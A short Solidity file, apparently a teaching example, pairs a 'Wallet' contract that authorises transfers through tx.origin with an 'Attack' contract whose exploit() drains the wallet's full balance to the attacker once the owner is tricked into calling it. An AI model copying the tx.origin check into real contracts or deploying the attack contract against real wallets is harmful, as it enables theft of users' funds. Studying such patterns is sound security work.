// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Wallet { 
    address public owner; 
    constructor() payable { 
        owner = msg.sender; 
    }
    
    function transfer(address payable _to, uint256 _amount) public { 
        require(tx.origin == owner, "Not owner"); 
        (bool sent,) = _to.call{value: _amount}(""); 
        require(sent, "Failed to send Ether"); 
    } 
}

contract Attack {
    address payable public attacker;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = _wallet;
        attacker = payable(msg.sender);
    }

    function exploit() external payable {
        wallet.transfer(attacker, address(wallet).balance);
    }
}